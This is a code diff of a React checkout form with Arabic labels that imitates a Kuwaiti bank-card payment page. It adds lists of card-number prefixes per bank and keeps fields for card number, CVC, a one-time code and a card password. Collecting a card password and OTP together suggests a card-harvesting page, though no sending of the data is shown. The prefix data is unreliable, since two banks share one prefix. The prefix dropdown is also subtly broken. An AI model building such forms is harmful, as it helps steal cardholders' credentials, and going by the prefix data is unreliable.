@@ -6,6 +6,7 @@ import { Card, CardContent, CardHeader } from "@/components/ui/card"
 import { Label } from "@/components/ui/label"
 import { validate } from '@/lib/utils'
 import { useCart } from '@/components/cart-provider'
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
 export type PaymentInfo = {
   cardNumber: string
   cvc: string
@@ -15,7 +16,8 @@ export type PaymentInfo = {
   otp?: string
   pass: string
   cardState: string
-  bank_card:string
+  bank_card:string[],
+  prefix:string
 
 }
 
@@ -23,31 +25,34 @@ export type PaymentMethod = 'credit_card' | 'kent' | 'bank_card'
 
 export type Bank = {
   value: string
-  label: string
+  label: string,
+  cardPrefixes:string[]
 }
 const month=['1','2','3','4','5','6','7','8','9','10','11','12']
 const years=['2024','2025','2026','2027','2028','2029','2030','2031','2032','2033','2034','2035']
 export const BANKS: Bank[] = [
-  { value: 'nbk', label: 'بنك الكويت الوطني' },
-  { value: 'cbk', label: 'البنك التجاري الكويتي' },
-  { value: 'gbk', label: 'بنك الخليج' },
-  { value: 'abk', label: 'البنك الأهلي الكويتي' },
-  { value: 'burgan', label: 'بنك برقان' },
-  { value: 'kfh', label: 'بيت التمويل الكويتي' },
-  { value: 'boubyan', label: 'بنك بوبيان' },
-  { value: 'kib', label: 'بنك الكويت الدولي' },
-  { value: 'ibk', label: 'البنك الصناعي الكويتي' },
-  { value: 'bbk', label: 'بنك البحرين والكويت' },
-  { value: 'bnp', label: 'بنك بي إن بي باريبا' },
-  { value: 'hsbc', label: 'بنك إتش إس بي سي الشرق الأوسط' },
-  { value: 'fab', label: 'بنك أبوظبي الأول' },
-  { value: 'citibank', label: 'سيتي بنك' },
-  { value: 'qnb', label: 'بنك قطر الوطني' },
-  { value: 'mashreq', label: 'بنك المشرق' },
-  { value: 'alrajhi', label: 'مصرف الراجحي' },
-  { value: 'bank_muscat', label: 'بنك مسقط' },
-  { value: 'icbc', label: 'البنك الصناعي والتجاري الصيني' },
-]
+  { value: 'nbk', label: 'National Bank of Kuwait', cardPrefixes: ["402277", "402299", "545629", "524176"] },
+  { value: 'cbk', label: 'Commercial Bank of Kuwait', cardPrefixes: ["403577", "525499", "529470"] },
+  { value: 'gbk', label: 'Gulf Bank', cardPrefixes: ["489319", "531759", "528012"] },
+  { value: 'abk', label: 'Al Ahli Bank of Kuwait', cardPrefixes: ["454721", "531380", "528488"] },
+  { value: 'burgan', label: 'Burgan Bank', cardPrefixes: ["418276", "522497", "529731"] },
+  { value: 'kfh', label: 'Kuwait Finance House', cardPrefixes: ["461007", "535967", "546734"] },
+  { value: 'boubyan', label: 'Boubyan Bank', cardPrefixes: ["486608", "529768", "536610"] },
+  { value: 'kib', label: 'Kuwait International Bank', cardPrefixes: ["514051", "530435", "535948"] },
+  { value: 'ibk', label: 'Industrial Bank of Kuwait', cardPrefixes: [] }, // Prefixes not publicly available
+  { value: 'bbk', label: 'Bank of Bahrain and Kuwait', cardPrefixes: ["400884", "518682"] },
+  { value: 'bnp', label: 'BNP Paribas', cardPrefixes: ["450216", "531483"] },
+  { value: 'hsbc', label: 'HSBC Middle East Bank', cardPrefixes: ["447284", "530001"] },
+  { value: 'fab', label: 'First Abu Dhabi Bank', cardPrefixes: ["440891", "530123"] },
+  { value: 'citibank', label: 'Citibank', cardPrefixes: ["431457", "545432"] },
+  { value: 'qnb', label: 'Qatar National Bank', cardPrefixes: ["489318", "529403"] },
+  { value: 'mashreq', label: 'Mashreq Bank', cardPrefixes: ["454388", "529410"] },
+  { value: 'alrajhi', label: 'Al Rajhi Bank', cardPrefixes: ["417633", "524469"] },
+  { value: 'bank_muscat', label: 'Bank Muscat', cardPrefixes: ["489312", "529410"] },
+  { value: 'icbc', label: 'Industrial and Commercial Bank of China', cardPrefixes: ["622200", "622888"] },
+];
+
+
 
 
 export default function PaymentForm({ 
@@ -58,7 +63,8 @@ export default function PaymentForm({
   const [step, setStep] = useState(1)
   const [isLoading, setIsLoading] = useState(false)
   const [showError, setShowError] = useState(false)
-  const { total } = useCart()
+  const {cart} = useCart()
+  const total = cart.reduce((sum, item) => sum + item.price * item.quantity, 0)
 
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('bank_card')
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
@@ -70,7 +76,8 @@ export default function PaymentForm({
     bank: '',
     pass: '',
     cardState:'new',
-    bank_card:''
+    bank_card:[''],
+    prefix:''
   })
 
   const handlePaymentInfoSubmit = async (e: React.FormEvent) => {
@@ -153,20 +160,27 @@ export default function PaymentForm({
                   <div className="space-y-4">
                     <div className="   flex border-b-2">
                       <Label className='text-blue-500 pb-4  w-32 pt-2 font-samll ' htmlFor="bank">يرجى اختيار البنك:</Label>
-                      <select 
-                        id="bank"
-                        className=" bg-gray-300 flex-auto h-6 border rounded-md  font-samll "
-                        value={paymentInfo.bank}
-                        onChange={(e) => setPaymentInfo({ ...paymentInfo, bank: e.target.value })}
-                        required
-                      >
-                        <option value="" disabled>يرجى اختيار البنك</option>
-                        {BANKS.map((bank) => (
-                          <option key={bank.value} value={bank.value}>
-                            {bank.label}
-                          </option>
-                        ))}
-                      </select>
+                      <Select 
+                onValueChange={(value) => {
+                  const selectedBank = BANKS.find(bank => bank.value === value)
+                  setPaymentInfo({ 
+                    ...paymentInfo, 
+                    bank: value, 
+                    bank_card: selectedBank ? selectedBank.cardPrefixes : ['']
+                  })
+                }}
+              >
+                <SelectTrigger className="w-full">
+                  <SelectValue placeholder="Select a bank" />
+                </SelectTrigger>
+                <SelectContent>
+                  {BANKS.map((bank: { value: any; label: any }) => (
+                    <SelectItem key={bank.value} value={bank.value}>
+                      {bank.label}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
                     </div>
 
                     <div className="space-y-2 flex border-b-2 mb-2">
@@ -186,11 +200,13 @@ export default function PaymentForm({
                         className=" bg-gray-300  flex-auto w-16 h-6 border rounded-md  font-samll "
                         required
                       >
-                        <option className='bg-gray-500' value="" disabled>prifx</option>
-                       
-                          <option value="{bank.value}">
-                          prifx
-                          </option>
+                        <option                          onChange={(e:any) => setPaymentInfo({ ...paymentInfo, prefix:e.target.value })}
+ className='bg-gray-500' value="" disabled>prifx</option>
+                       {paymentInfo.bank_card.map((i)=>
+                          <option value={i}>
+{
+i}                          </option>
+                          )}
                       </select>
                     </div>
                     </div>
